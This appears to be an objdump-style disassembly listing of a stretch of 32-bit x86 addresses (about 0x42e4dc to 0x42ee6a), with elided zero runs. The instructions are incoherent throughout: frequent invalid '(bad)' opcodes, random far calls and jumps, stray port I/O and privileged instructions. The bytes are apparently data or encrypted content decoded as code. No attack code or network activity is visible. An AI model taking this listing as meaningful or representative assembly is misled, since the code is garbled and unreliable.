  42e4dc:	xor    al,0x97
  42e4de:	iret   
  42e4df:	pop    edx
  42e4e0:	shl    BYTE PTR [ebp-0x1d],cl
  42e4e3:	dec    ecx
  42e4e4:	jae    0x42e536
  42e4e6:	mov    esi,0xae54d203
  42e4eb:	push   esp
  42e4ec:	(bad)  
  42e4ed:	fsubr  st(4),st
  42e4ef:	or     ebx,0xffffffde
  42e4f2:	adc    BYTE PTR [esi],cl
  42e4f4:	retf   
  42e4f5:	inc    eax
  42e4f6:	test   al,0x33
  42e4f8:	sub    BYTE PTR [edx-0x27],dl
  42e4fb:	add    bl,BYTE PTR [edx+0x2f]
  42e4fe:	jge    0x42e4c3
  42e500:	lods   al,BYTE PTR ds:[esi]
  42e501:	inc    ebx
  42e502:	inc    esi
  42e503:	outs   dx,BYTE PTR ds:[esi]
  42e504:	in     al,0xe3
  42e506:	mov    eax,ds:0xbf2ab458
  42e50b:	xor    ecx,DWORD PTR [edi+0x19]
  42e50e:	loop   0x42e58a
  42e510:	sub    al,0x10
  42e512:	inc    esi
  42e513:	hlt    
  42e514:	push   ebp
  42e515:	mov    ch,0xe1
  42e517:	inc    ebx
  42e518:	call   0xed38:0xa3e774a2
  42e51f:	fbstp  TBYTE PTR es:[edi+ebp*4+0x35ff68a]
  42e527:	lods   eax,DWORD PTR ds:[esi]
  42e528:	xor    DWORD PTR [ecx+ebx*4-0x24844b65],edi
  42e52f:	xor    DWORD PTR [eax],esp
  42e531:	xchg   edx,eax
  42e532:	mov    dl,0x16
  42e534:	jae    0x42e509
  42e536:	int    0x1e
  42e538:	cs inc edi
  42e53b:	dec    esi
  42e53d:	jne    0x42e4df
  42e53f:	loop   0x42e56b
  42e541:	jge    0x42e50b
  42e543:	in     eax,dx
  42e544:	cli    
  42e545:	xchg   ebx,eax
  42e546:	nop
  42e547:	ss inc ecx
  42e549:	xor    al,0x82
  42e54b:	fwait
  42e54c:	inc    ecx
  42e54d:	mov    eax,0x27096e3d
  42e552:	out    0x9b,al
  42e554:	shr    BYTE PTR [bx+di-0x4644],cl
  42e559:	jle    0x42e4f2
  42e55b:	mov    al,0x43
  42e55d:	push   es
  42e55e:	push   eax
  42e55f:	push   cs
  42e560:	fisub  DWORD PTR [edi+esi*1-0x4b]
  42e564:	repnz fistp DWORD PTR [ebx]
  42e567:	xor    al,0x4a
  42e569:	mov    al,ds:0xd6ae174a
  42e56e:	add    eax,ecx
  42e570:	xchg   esp,eax
  42e571:	dec    esp
  42e572:	addr16 cwde 
  42e574:	lahf   
  42e575:	mov    dl,0x60
  42e577:	int    0x88
  42e579:	push   ebx
  42e57a:	cs or  eax,0xc9d533ea
  42e580:	fiadd  WORD PTR [edx+ebp*2+0x13]
  42e584:	adc    DWORD PTR [edi+0x76154bd],0x6673f476
  42e58e:	(bad)  
  42e58f:	enter  0x0,0x0
	...
  42e5f3:	add    BYTE PTR [ebp+0x38],dl
  42e5f6:	into   
  42e5f7:	adc    bh,ch
  42e5f9:	neg    bh
  42e5fb:	jge    0x42e58f
  42e5fd:	xchg   ebp,eax
  42e5fe:	jns    0x42e631
  42e600:	lock cwde 
  42e602:	fisttp WORD PTR [esp+eax*2+0x40001f0]
  42e609:	add    DWORD PTR [eax],eax
  42e60b:	add    ah,bl
  42e60d:	ins    BYTE PTR es:[edi],dx
  42e60e:	push   edi
  42e60f:	and    bh,BYTE PTR [edi-0x1d]
  42e612:	lods   al,BYTE PTR ds:[esi]
  42e613:	push   0x34b54268
  42e618:	call   0x5a5778eb
  42e61d:	(bad)
  42e620:	imul   ebp,DWORD PTR [ecx+0x40],0xfffffff3
  42e624:	ret    0xd55a
  42e627:	icebp  
  42e628:	mov    dh,0x9d
  42e62a:	dec    BYTE PTR [ebx]
  42e62c:	push   es
  42e62d:	(bad)  
  42e62e:	xchg   ecx,eax
  42e62f:	out    dx,al
  42e630:	sbb    ch,ah
  42e632:	clc    
  42e633:	or     DWORD PTR [ecx],eax
  42e635:	pusha  
  42e636:	add    BYTE PTR [edi-0x14],bh
  42e639:	pop    ecx
  42e63a:	xlat   BYTE PTR ds:[ebx]
  42e63b:	lods   al,BYTE PTR ds:[esi]
  42e63c:	ret    0x80b1
  42e63f:	icebp  
  42e640:	mov    edi,0x2cdb5ee1
  42e645:	daa    
  42e646:	push   ss
  42e647:	outs   dx,BYTE PTR ds:[esi]
  42e648:	or     DWORD PTR [ebp-0x46],0xb4e568f8
  42e64f:	in     eax,0xe4
  42e651:	lods   eax,DWORD PTR ds:[esi]
  42e652:	ret    
  42e653:	in     eax,0x7f
  42e655:	xor    edi,esp
  42e657:	outs   dx,BYTE PTR ds:[esi]
  42e658:	fmul   st(1),st
  42e65a:	dec    ebx
  42e65b:	mov    esi,0x17a7cc83
  42e660:	fdivr  st(7),st
  42e662:	mov    eax,ds:0x50db1857
  42e667:	dec    esi
  42e668:	push   ebx
  42e669:	pop    ebp
  42e66a:	loopne 0x42e6da
  42e66c:	scas   al,BYTE PTR es:[edi]
  42e66d:	mov    esp,0x8d382c44
  42e672:	inc    edx
  42e673:	mov    edi,0x97a95c40
  42e678:	outs   dx,DWORD PTR ds:[esi]
  42e679:	inc    eax
  42e67a:	je     0x42e667
  42e67c:	pop    ecx
  42e67d:	mov    fs,WORD PTR [edx+0x11e05f61]
  42e683:	adc    eax,0xce8463a6
  42e688:	adc    eax,0xfaf282cc
  42e68d:	push   0x11
  42e68f:	inc    eax
  42e690:	and    DWORD PTR [ecx],edi
  42e692:	cmp    DWORD PTR ds:0x1b4f014d,ecx
  42e698:	mov    ds:0x578c8ec2,al
  42e69d:	mov    fs,WORD PTR [ebx]
  42e69f:	push   edi
  42e6a0:	into   
  42e6a1:	cmp    DWORD PTR [ebx],eax
  42e6a3:	clc    
  42e6a4:	xchg   ecx,eax
  42e6a5:	fs enter 0x9365,0x82
  42e6aa:	aam    0x44
  42e6ac:	xor    eax,0x5b5e384d
  42e6b1:	(bad)  
  42e6b2:	ror    dl,0xfd
  42e6b5:	xchg   BYTE PTR [edx+eiz*8+0x36],cl
  42e6b9:	mov    gs,WORD PTR [eax+0x6c]
  42e6bc:	jg     0x42e66b
  42e6be:	scas   al,BYTE PTR es:[edi]
  42e6bf:	mov    DWORD PTR [esi],0xb0774688
  42e6c5:	out    0x43,al
  42e6c7:	sar    BYTE PTR [edi+0x74],cl
  42e6ca:	xchg   ebp,eax
  42e6cb:	add    dl,bl
  42e6cd:	jecxz  0x42e712
  42e6cf:	mov    edi,esi
  42e6d1:	dec    ebp
  42e6d2:	jne    0x42e6b2
  42e6d4:	das    
  42e6d5:	mov    eax,0x896c8a24
  42e6da:	dec    edx
  42e6db:	push   eax
  42e6dc:	pop    es
  42e6dd:	push   ds
  42e6de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e6df:	sub    bh,BYTE PTR [edx+0x1ed2cf93]
  42e6e5:	adc    esp,ebp
  42e6e7:	sar    BYTE PTR [ebx],1
  42e6e9:	dec    esp
  42e6ea:	in     al,0x55
  42e6ec:	cmp    bh,BYTE PTR [esp+eax*4-0x39]
  42e6f0:	xchg   ebx,eax
  42e6f1:	push   ecx
  42e6f2:	mov    ecx,0xd125f11c
  42e6f7:	cmp    BYTE PTR [esi],dh
  42e6f9:	push   0xb
  42e6fb:	(bad)  
  42e6fc:	sub    eax,0xc766eda9
  42e701:	call   0xadf9ceaf
  42e706:	or     eax,0xc8864a6a
  42e70b:	arpl   WORD PTR [ebx+ebp*2],ax
  42e70e:	nop
  42e70f:	pop    es
	...
  42e774:	pop    edx
  42e775:	cmp    DWORD PTR [esi+0x2d],ecx
  42e778:	outs   dx,DWORD PTR ds:[esi]
  42e779:	jg     0x42e7f6
  42e77b:	jg     0x42e7e1
  42e77d:	sub    BYTE PTR [esi],cl
  42e77f:	fimul  DWORD PTR [ebx-0x80]
  42e782:	xchg   ebp,eax
  42e783:	sbb    DWORD PTR [eax-0xf],ecx
  42e786:	add    DWORD PTR [eax],eax
  42e788:	add    al,0x1
  42e78a:	add    BYTE PTR [eax],al
  42e78c:	stc    
  42e78d:	mov    dl,0xe
  42e78f:	int    0x6e
  42e791:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e792:	mov    esp,0x8ea78a38
  42e797:	mov    eax,0x9873c3b1
  42e79c:	daa    
  42e79d:	ret    
  42e79e:	es repnz push 0xaf7ea40f
  42e7a5:	inc    eax
  42e7a6:	push   ds
  42e7a7:	and    cl,BYTE PTR [edi]
  42e7a9:	and    esp,ebx
  42e7ab:	and    eax,0xdb1bbd81
  42e7b0:	jns    0x42e769
  42e7b2:	inc    edi
  42e7b3:	(bad)  
  42e7b4:	dec    ebx
  42e7b5:	mov    ds:0x6b0b29d1,al
  42e7ba:	cld    
  42e7bb:	ror    DWORD PTR [edi],1
  42e7bd:	stos   DWORD PTR es:[edi],eax
  42e7be:	call   0xd436:0xeba62be2
  42e7c5:	pusha  
  42e7c6:	lods   al,BYTE PTR ds:[esi]
  42e7c7:	ds cmc 
  42e7c9:	into   
  42e7ca:	mov    eax,ds:0x860f0f66
  42e7cf:	test   BYTE PTR ds:0x27e7f700,0xe2
  42e7d6:	cmp    cl,BYTE PTR [eax+0x1734f0db]
  42e7dc:	ss add al,ah
  42e7df:	sbb    eax,0x82f557ce
  42e7e4:	mov    ebp,0xc2e1f936
  42e7e9:	aas    
  42e7ea:	fdiv   QWORD PTR [edi]
  42e7ec:	dec    edi
  42e7ed:	mov    bh,0xa7
  42e7ef:	sub    DWORD PTR [eax+edi*1+0x366b663e],esi
  42e7f6:	mov    dl,0x68
  42e7f8:	push   es
  42e7f9:	mov    dh,0x5e
  42e7fb:	inc    edx
  42e7fc:	sub    esi,DWORD PTR [ebx+esi*1]
  42e7ff:	in     al,0xb2
  42e801:	mov    esi,0x530a35e2
  42e806:	inc    edx
  42e807:	ret    0x9e14
  42e80a:	out    0x56,al
  42e80c:	rcl    cl,cl
  42e80e:	adc    eax,0xf6efd265
  42e813:	mov    edx,0xfc78f24f
  42e818:	lods   al,BYTE PTR ds:[esi]
  42e819:	xchg   ebx,eax
  42e81a:	dec    ebp
  42e81b:	mov    cl,0x6b
  42e81d:	inc    esi
  42e81e:	xchg   ebp,eax
  42e81f:	in     al,dx
  42e820:	jecxz  0x42e7ed
  42e822:	outs   dx,BYTE PTR ds:[esi]
  42e823:	xchg   esp,eax
  42e824:	in     al,0x40
  42e826:	stos   BYTE PTR es:[edi],al
  42e827:	and    ah,BYTE PTR [edi]
  42e829:	inc    eax
  42e82a:	daa    
  42e82b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e82c:	pop    ds
  42e82d:	dec    edi
  42e82e:	sbb    al,0x65
  42e830:	mov    cl,0xc9
  42e832:	cdq    
  42e833:	or     al,0xa5
  42e835:	jns    0x42e860
  42e837:	cmp    eax,0x85558f2f
  42e83c:	leave  
  42e83d:	xchg   esp,eax
  42e83e:	sub    dl,BYTE PTR [ebx]
  42e840:	dec    ebp
  42e841:	or     ebp,eax
  42e843:	int3   
  42e844:	jns    0x42e7d5
  42e846:	lods   eax,DWORD PTR ds:[esi]
  42e847:	inc    ebp
  42e848:	fadd   DWORD PTR [eax-0x6bd7dd1c]
  42e84e:	enter  0xdf6e,0x5c
  42e852:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e854:	add    ecx,DWORD PTR [eax]
  42e856:	inc    edx
  42e857:	dec    esp
  42e858:	add    esi,ebp
  42e85a:	or     al,0xda
  42e85c:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  42e85e:	mov    bl,0x52
  42e860:	imul   ebp,DWORD PTR es:[edi],0x2e
  42e864:	mov    bh,0x52
  42e866:	out    dx,eax
  42e867:	cmp    ch,0xba
  42e86a:	fmul   st,st(4)
  42e86c:	div    BYTE PTR cs:[edi-0x605bc90]
  42e873:	ret    
  42e874:	(bad)  
  42e875:	mov    bl,0xd3
  42e877:	call   FWORD PTR [edi]
  42e879:	aaa    
  42e87a:	les    esp,FWORD PTR [edx+0x681ffe3c]
  42e880:	mov    ebp,0x2a4e94d5
  42e885:	add    ah,BYTE PTR [esi+edx*2-0x1a0015a7]
  42e88c:	jl     0x42e838
  42e88e:	add    al,BYTE PTR [ebx]
	...
  42e8f4:	ret    
  42e8f5:	ja     0x42e957
  42e8f7:	and    al,0xf4
  42e8f9:	aaa    
  42e8fa:	(bad)  
  42e8fb:	div    DWORD PTR [ecx-0x1fdc07d5]
  42e901:	cmp    edx,DWORD PTR [edx-0x26]
  42e904:	dec    esp
  42e905:	repnz add DWORD PTR [eax],eax
  42e908:	add    al,0x1
  42e90a:	add    BYTE PTR [eax],al
  42e90c:	(bad)  [ebp-0x5]
  42e90f:	push   edi
  42e910:	aas    
  42e911:	in     eax,0xe
  42e913:	les    esp,FWORD PTR [edi]
  42e915:	test   al,0x17
  42e917:	dec    edi
  42e918:	lods   eax,DWORD PTR ds:[esi]
  42e919:	xchg   BYTE PTR [ebx+0x17],cl
  42e91c:	imul   edi,DWORD PTR [eax+0x15],0xe05f65f4
  42e923:	sbb    ch,BYTE PTR [ebx+eiz*8+0x21725d65]
  42e92a:	fwait
  42e92b:	pop    edx
  42e92c:	push   cs
  42e92d:	push   eax
  42e92e:	dec    ebp
  42e92f:	mov    WORD PTR [ebp-0x287fd2ff],?
  42e935:	jmp    0x4ed8:0x20b36f0e
  42e93c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e93d:	sub    al,0x89
  42e93f:	and    eax,eax
  42e941:	(bad)  
  42e942:	rol    BYTE PTR [esi+0x52651e65],0x2e
  42e949:	fdivr  st,st(5)
  42e94b:	and    BYTE PTR [eax],0xc8
  42e94e:	or     BYTE PTR [edi+0x4b],bl
  42e951:	sbb    al,0xdf
  42e953:	out    dx,al
  42e954:	stos   DWORD PTR es:[edi],eax
  42e955:	pop    ecx
  42e956:	mov    ecx,0xf5c5aca3
  42e95b:	adc    BYTE PTR [ebp-0x6a],cl
  42e95e:	aaa    
  42e95f:	mov    bl,0x7b
  42e961:	ins    DWORD PTR es:[edi],dx
  42e962:	sbb    DWORD PTR [ebx+0x5d1c0db3],esi
  42e968:	lock mov eax,ds:0x6c7695f9
  42e96e:	inc    ebx
  42e96f:	pop    eax
  42e970:	test   al,0x97
  42e972:	sbb    BYTE PTR [ebp+0x2a],bl
  42e975:	(bad)
  42e978:	push   ecx
  42e979:	or     al,0x20
  42e97b:	dec    edx
  42e97c:	rcr    dl,0x7d
  42e97f:	(bad)  
  42e980:	cmp    dl,BYTE PTR [edx]
  42e982:	jle    0x42e9c9
  42e984:	mov    esi,0x36d8052b
  42e989:	xor    DWORD PTR [ebx+0x12665323],0x8cbf10db
  42e993:	ss sbb eax,0xbddda32d
  42e999:	and    DWORD PTR [ebp+0x6c587578],0x8
  42e9a0:	leave  
  42e9a1:	ins    DWORD PTR es:[edi],dx
  42e9a2:	cmp    eax,0xcf2dcffa
  42e9a7:	cmp    al,0x7
  42e9a9:	pop    ss
  42e9aa:	sbb    DWORD PTR [edx],ecx
  42e9ac:	push   esp
  42e9ad:	sub    esp,ebp
  42e9af:	imul   edx,DWORD PTR [edx+0x79],0x8f2c1c6e
  42e9b6:	cmc    
  42e9b7:	or     eax,0x66e956fc
  42e9bc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e9bd:	popf   
  42e9be:	jl     0x42e97c
  42e9c0:	xor    al,0xbe
  42e9c2:	pop    ebp
  42e9c3:	ss cld 
  42e9c5:	pop    edi
  42e9c6:	jge    0x42e95b
  42e9c8:	mov    al,ds:0x19168697
  42e9cd:	(bad)  
  42e9ce:	fisub  WORD PTR [edx-0x62]
  42e9d1:	sub    edi,DWORD PTR ds:0x9d3ea1
  42e9d7:	sub    ebp,DWORD PTR [edi]
  42e9d9:	jae    0x42e9b5
  42e9db:	repnz shl BYTE PTR [ebp-0x46a74585],1
  42e9e2:	and    BYTE PTR [eax-0x4b32a786],bh
  42e9e8:	std    
  42e9e9:	les    edx,FWORD PTR [ebp-0x62]
  42e9ec:	int3   
  42e9ed:	inc    eax
  42e9ee:	xchg   ebx,eax
  42e9ef:	pop    esp
  42e9f0:	pushf  
  42e9f1:	faddp  st(4),st
  42e9f3:	pop    ebp
  42e9f4:	push   ecx
  42e9f5:	dec    ecx
  42e9f6:	out    dx,eax
  42e9f7:	mov    ds:0xf5be7032,al
  42e9fc:	pop    ecx
  42e9fd:	lds    edx,FWORD PTR [edi-0x13]
  42ea00:	xchg   DWORD PTR [eax],edi
  42ea02:	jl     0x42ea52
  42ea04:	aad    0x69
  42ea06:	popa   
  42ea07:	cmp    ch,BYTE PTR [eax-0x308b503b]
  42ea0d:	add    ebx,ebx
  42ea0f:	les    eax,FWORD PTR [eax]
	...
  42ea71:	add    BYTE PTR [eax],al
  42ea73:	add    ch,ah
  42ea75:	mov    edx,0xebdfe392
  42ea7a:	cmc    
  42ea7b:	mov    esi,0x66dc160c
  42ea80:	ins    DWORD PTR es:[edi],dx
  42ea81:	out    0xce,eax
  42ea83:	sbb    eax,0x1f350
  42ea88:	add    al,0x1
  42ea8a:	add    BYTE PTR [eax],al
  42ea8c:	(bad)  
  42ea90:	add    dl,BYTE PTR [esp+ebp*4]
  42ea93:	adc    DWORD PTR ds:0x760e428d,ebx
  42ea99:	add    bl,BYTE PTR [edi]
  42ea9b:	push   esi
  42ea9c:	sti    
  42ea9d:	mov    BYTE PTR [ecx-0xe04ff24],0x84
  42eaa4:	pop    eax
  42eaa5:	scas   al,BYTE PTR es:[edi]
  42eaa6:	mov    cl,0x91
  42eaa8:	xlat   BYTE PTR ds:[ebx]
  42eaa9:	imul   esi,DWORD PTR [ebx+0x7cddfed2],0xffffffbc
  42eab0:	jecxz  0x42ea45
  42eab2:	jecxz  0x42eb18
  42eab4:	bound  esi,QWORD PTR [edi-0x11]
  42eab7:	ins    BYTE PTR es:[edi],dx
  42eab8:	mov    bl,0x36
  42eaba:	and    cl,dh
  42eabc:	adc    DWORD PTR [edi+0x13f3b5e8],esp
  42eac2:	mov    DWORD PTR [edx],eax
  42eac4:	ja     0x42eae1
  42eac6:	push   ebx
  42eac7:	sahf   
  42eac8:	adc    cl,BYTE PTR [edx*1+0x3c2c49fc]
  42eacf:	or     DWORD PTR [edx-0x52],edx
  42ead2:	inc    eax
  42ead3:	into   
  42ead4:	jl     0x42eb34
  42ead6:	test   eax,0xc5a2b576
  42eadb:	fcmovu st,st(2)
  42eadd:	mov    al,0xe5
  42eadf:	adc    al,0x5
  42eae1:	cmp    DWORD PTR [esi+ecx*2-0x6d09ca3f],0xb0d686ac
  42eaec:	je     0x42ead9
  42eaee:	les    esi,FWORD PTR [edi-0x23e2e801]
  42eaf4:	dec    esp
  42eaf5:	xchg   BYTE PTR [eax-0x80],al
  42eaf8:	imul   ebp,DWORD PTR [ebx-0x223949ee],0x29
  42eaff:	(bad)  [edx+0x7196b6c]
  42eb05:	mov    esi,ebp
  42eb07:	cmp    al,0x33
  42eb09:	das    
  42eb0a:	push   eax
  42eb0b:	xor    al,0x81
  42eb0d:	mov    ebx,0x724ecb30
  42eb12:	sub    ebp,DWORD PTR [eax-0x72]
  42eb15:	adc    ebp,edx
  42eb17:	jno    0x42eaeb
  42eb19:	fdivr  QWORD PTR [ecx+0x70]
  42eb1c:	push   cs
  42eb1d:	sub    DWORD PTR [eax-0x49ee27c3],0xfffffff3
  42eb24:	clc    
  42eb25:	retf   
  42eb26:	mov    edx,0x912c12e8
  42eb2b:	addr16 jo 0x42eab4
  42eb2e:	nop
  42eb2f:	sti    
  42eb30:	lahf   
  42eb31:	shr    DWORD PTR [edx],cl
  42eb33:	(bad)  
  42eb34:	mov    al,ds:0x84de6d0
  42eb39:	imul   eax,DWORD PTR ds:0x451b6ca5,0xffffffe9
  42eb40:	and    eax,0x9df41600
  42eb45:	jo     0x42ead0
  42eb47:	in     eax,0x2b
  42eb49:	int    0x51
  42eb4b:	stc    
  42eb4c:	ja     0x42ebc8
  42eb4e:	leave  
  42eb4f:	fdiv   QWORD PTR [eax-0x57cfeae7]
  42eb55:	pop    eax
  42eb56:	add    eax,0x631b8024
  42eb5b:	jmp    0x7739:0x4b894893
  42eb62:	(bad)  
  42eb63:	pushf  
  42eb64:	fs xlat BYTE PTR gs:[ebx]
  42eb67:	xchg   ebp,eax
  42eb68:	call   0x7b37cf56
  42eb6d:	sub    al,0x82
  42eb6f:	xor    eax,DWORD PTR [esi-0x51]
  42eb72:	mov    WORD PTR [ebp+0x658d2083],?
  42eb78:	test   al,0x5d
  42eb7a:	daa    
  42eb7b:	outs   dx,DWORD PTR ds:[esi]
  42eb7c:	and    ebx,0x327ee635
  42eb82:	add    BYTE PTR [ecx+edi*8-0x3373cc1c],0xc5
  42eb8a:	(bad)  
  42eb8b:	scas   al,BYTE PTR es:[edi]
  42eb8c:	ins    DWORD PTR es:[edi],dx
  42eb8d:	xchg   ebp,eax
  42eb8e:	jmp    0x42ebae
	...
  42ebf4:	jle    0x42ec37
  42ebf6:	jne    0xfc41bb3b
  42ebfc:	pusha  
  42ebfd:	popf   
  42ebfe:	pop    ecx
  42ebff:	sbb    DWORD PTR [edx+edx*4-0xbabb085],0x1040001
  42ec0a:	add    BYTE PTR [eax],al
  42ec0c:	push   ecx
  42ec0d:	lds    ebx,FWORD PTR [ebx-0x64bcee1a]
  42ec13:	adc    ah,dl
  42ec15:	(bad)  
  42ec17:	icebp  
  42ec18:	mov    ebp,0xa80fcc8f
  42ec1d:	iret   
  42ec1e:	pop    eax
  42ec1f:	outs   dx,BYTE PTR ds:[esi]
  42ec20:	sbb    DWORD PTR [edi-0x31],esp
  42ec23:	loopne 0x42ebf3
  42ec25:	test   al,0x71
  42ec27:	inc    edx
  42ec28:	ror    DWORD PTR ds:0x69ed76c,1
  42ec2e:	fisttp WORD PTR ds:[ebx-0x2712b509]
  42ec35:	mov    al,ds:0x946304f9
  42ec3a:	adc    al,0x5a
  42ec3c:	adc    DWORD PTR [edx-0x365865dd],ecx
  42ec42:	popaw  
  42ec44:	push   ebp
  42ec45:	pop    edx
  42ec46:	mov    edx,0x4f71d205
  42ec4b:	lds    ecx,FWORD PTR [edx-0x4d]
  42ec4e:	push   ecx
  42ec4f:	dec    eax
  42ec50:	cmp    ebp,0x3b6d0432
  42ec56:	pop    ebx
  42ec57:	pop    edi
  42ec58:	icebp  
  42ec59:	sti    
  42ec5a:	cmp    bl,BYTE PTR [esi]
  42ec5c:	popa   
  42ec5d:	or     al,0xd9
  42ec5f:	pop    ecx
  42ec60:	sub    edi,0x7c2acc53
  42ec66:	push   es
  42ec67:	pop    eax
  42ec68:	in     eax,dx
  42ec69:	and    DWORD PTR [ebx+0xc],edi
  42ec6c:	xchg   esi,eax
  42ec6d:	int    0xea
  42ec6f:	add    DWORD PTR [eax-0xd97b471],edx
  42ec75:	daa    
  42ec76:	push   esi
  42ec77:	jp     0x42ec95
  42ec79:	jg     0x42ec18
  42ec7b:	jns    0x42ec6d
  42ec7d:	leave  
  42ec7e:	push   eax
  42ec7f:	xchg   edx,eax
  42ec80:	cli    
  42ec81:	sti    
  42ec82:	arpl   WORD PTR [ebp+eiz*8+0x73a88d83],cx
  42ec89:	jnp    0x42ec45
  42ec8b:	idiv   cl
  42ec8d:	xor    eax,esp
  42ec8f:	div    al
  42ec91:	jbe    0x42ecd5
  42ec93:	jae    0x42eca2
  42ec95:	data16 pop ax
  42ec98:	xchg   edx,eax
  42ec99:	jne    0x42ec33
  42ec9b:	outs   dx,BYTE PTR ds:[esi]
  42ec9c:	jnp    0x42ec99
  42ec9e:	push   edx
  42ec9f:	pop    edi
  42eca0:	mov    ecx,0x3f262f80
  42eca5:	shl    esi,0x58
  42eca8:	cld    
  42eca9:	mov    ebp,0x22c21c82
  42ecae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42ecaf:	test   DWORD PTR [ecx],0xcc8e1c68
  42ecb5:	fisub  DWORD PTR [ebp+0x339e4231]
  42ecbb:	das    
  42ecbc:	outs   dx,DWORD PTR ds:[esi]
  42ecbd:	js     0x42ecf3
  42ecbf:	(bad)
  42ecc3:	in     eax,0xed
  42ecc5:	js     0x42ecb0
  42ecc7:	stos   DWORD PTR es:[edi],eax
  42ecc8:	mov    ebp,0xc2a5fa2d
  42eccd:	mov    ah,0xc1
  42eccf:	in     al,dx
  42ecd0:	jne    0x42eccb
  42ecd2:	(bad)  
  42ecd3:	repz or eax,DWORD PTR [esi]
  42ecd6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42ecd7:	xchg   DWORD PTR [eax-0x6c],ecx
  42ecda:	outs   dx,BYTE PTR ds:[esi]
  42ecdb:	outs   dx,DWORD PTR ds:[esi]
  42ecdc:	test   al,0x85
  42ecde:	loopne 0x42ed5e
  42ece0:	push   ebx
  42ece1:	das    
  42ece2:	inc    eax
  42ece3:	xor    eax,0x931e3b49
  42ece8:	repnz rcr BYTE PTR [ecx+esi*1-0x18],0x2e
  42ecee:	cld    
  42ecef:	out    dx,eax
  42ecf0:	in     eax,dx
  42ecf1:	sbb    DWORD PTR [ecx-0xf],0xffffffca
  42ecf5:	pop    esi
  42ecf6:	fldenv ds:0x16edb218
  42ecfc:	push   edi
  42ecfd:	jp     0x42ecd4
  42ecff:	(bad)  
  42ed00:	cmc    
  42ed01:	jmp    0x2bbedfae
  42ed06:	cdq    
  42ed07:	dec    ecx
  42ed08:	cmp    BYTE PTR [eax+0x120f1700],bh
  42ed0e:	and    DWORD PTR [ebx],0x0
	...
  42ed74:	sub    dh,dh
  42ed76:	scas   eax,DWORD PTR es:[edi]
  42ed77:	fdivr  st,st(7)
  42ed79:	fnstcw WORD PTR [edi-0xa]
  42ed7c:	jecxz  0x42edb0
  42ed7e:	test   DWORD PTR [edx+0x6a50e2e5],esp
  42ed84:	pop    eax
  42ed85:	cmc    
  42ed86:	add    DWORD PTR [eax],eax
  42ed88:	add    al,0x1
  42ed8a:	add    BYTE PTR [eax],al
  42ed8c:	pop    ebp
  42ed8d:	push   ebp
  42ed8e:	pop    edx
  42ed8f:	mov    eax,ds:0xd9f7b91a
  42ed94:	scas   al,BYTE PTR es:[edi]
  42ed95:	dec    edx
  42ed96:	not    BYTE PTR [esi]
  42ed98:	add    bl,BYTE PTR [edi+0x6]
  42ed9b:	pop    ebp
  42ed9c:	test   BYTE PTR cs:[esi-0xaa3a0fa],ch
  42eda3:	or     esp,edx
  42eda5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42eda6:	dec    esi
  42eda7:	cwde   
  42eda8:	or     al,dh
  42edaa:	sub    DWORD PTR [esi],0x53
  42edad:	loop   0x42ede8
  42edaf:	icebp  
  42edb0:	test   esp,edx
  42edb2:	xor    dl,BYTE PTR [eax-0x25]
  42edb5:	and    eax,0xef8d5e9c
  42edba:	fs xchg ebp,eax
  42edbc:	not    dl
  42edbe:	outs   dx,DWORD PTR ds:[esi]
  42edbf:	bound  ecx,QWORD PTR [ebp+0x62]
  42edc2:	mov    al,ds:0xac15fe14
  42edc7:	push   edx
  42edc8:	lahf   
  42edc9:	sbb    bl,cl
  42edcb:	addr16 (bad) 
  42edcd:	mov    eax,ds:0x267b3430
  42edd2:	adc    al,0x78
  42edd4:	faddp  st(2),st
  42edd6:	xor    BYTE PTR [ebp+0x1a],bl
  42edd9:	jae    0x42ee00
  42eddb:	push   cs
  42eddc:	and    al,0xf1
  42edde:	dec    ebx
  42eddf:	or     ecx,eax
  42ede1:	adc    edx,edx
  42ede3:	sbb    BYTE PTR [esi+0x6],0xba
  42ede7:	jle    0x42edf8
  42ede9:	sub    DWORD PTR [ecx+0x22],ecx
  42edec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42eded:	aaa    
  42edee:	cwde   
  42edef:	jl     0x42ed8c
  42edf1:	jecxz  0x42ee61
  42edf3:	or     BYTE PTR [eax-0x16c16371],ch
  42edf9:	adc    al,0x49
  42edfb:	popf   
  42edfc:	mov    ecx,0x2e4143b8
  42ee01:	(bad)  
  42ee02:	test   al,0xf9
  42ee04:	mov    ecx,0x303a1d78
  42ee09:	cs jnp 0x42edc9
  42ee0c:	pushf  
  42ee0d:	pop    eax
  42ee0e:	mov    eax,0x28e420ea
  42ee13:	call   0xf6b5:0xea4f62
  42ee1a:	pop    ebp
  42ee1b:	jle    0x42edca
  42ee1d:	int3   
  42ee1e:	call   FWORD PTR cs:[edx+0x3ef00e56]
  42ee25:	out    dx,al
  42ee26:	push   0x665466d2
  42ee2b:	or     DWORD PTR [eax+0x67],ebx
  42ee2e:	shr    DWORD PTR [ecx+0x66],0xe
  42ee32:	dec    esp
  42ee33:	jno    0x42ee2d
  42ee35:	cmp    DWORD PTR [esi+0x164e80b3],edi
  42ee3b:	pop    esi
  42ee3c:	sti    
  42ee3d:	cmp    al,0x9a
  42ee3f:	div    BYTE PTR [eax+0x6e01a84c]
  42ee45:	xchg   DWORD PTR [eax-0x2e],esi
  42ee48:	adc    ebx,DWORD PTR [ebx+ebp*4]
  42ee4b:	jns    0x42ee63
  42ee4d:	ins    DWORD PTR es:[edi],dx
  42ee4e:	dec    esi
  42ee4f:	cmp    edi,DWORD PTR [eax]
  42ee51:	inc    edx
  42ee52:	add    DWORD PTR [esi],edi
  42ee54:	inc    ebp
  42ee55:	in     eax,dx
  42ee56:	inc    esp
  42ee57:	pop    ebp
  42ee58:	fcmovb st,st(2)
  42ee5a:	scas   eax,DWORD PTR es:[edi]
  42ee5b:	cmp    eax,0xcbf3f5dc
  42ee60:	pop    ss
  42ee61:	(bad)  [edx+ebx*4-0x2886fbf]
  42ee68:	inc    eax
  42ee69:	xchg   esi,eax
  42ee6a:	lds    ecx,FWORD PTR ds:0x1ab2d926
